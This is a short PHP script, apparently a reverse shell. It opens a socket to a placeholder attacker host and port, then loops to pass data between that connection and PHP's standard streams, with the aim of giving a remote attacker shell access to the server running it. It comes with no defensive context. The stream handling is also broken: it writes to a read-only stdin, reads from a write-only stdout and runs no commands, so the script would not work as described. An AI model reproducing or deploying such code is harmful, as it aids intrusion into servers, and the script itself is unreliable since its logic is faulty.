<?php
// Set the IP and port of the attacking machine
$ip = 'ATTACKING_MACHINE_IP';
$port = 'ATTACKING_MACHINE_PORT';

// Create a socket and connect to the attacking machine
$sock = fsockopen($ip, $port);

// Set the input and output streams for the socket
$stdin = fopen('php://stdin', 'r');
$stdout = fopen('php://stdout', 'w');

// Loop and send any input from the attacking machine to PHP's stdin and
// send any output from PHP's stdout to the attacking machine
while (!feof($sock)) {
    fwrite($stdin, fread($sock, 1024));
    fwrite($sock, fread($stdout, 1024));
}

// Close the socket
fclose($sock);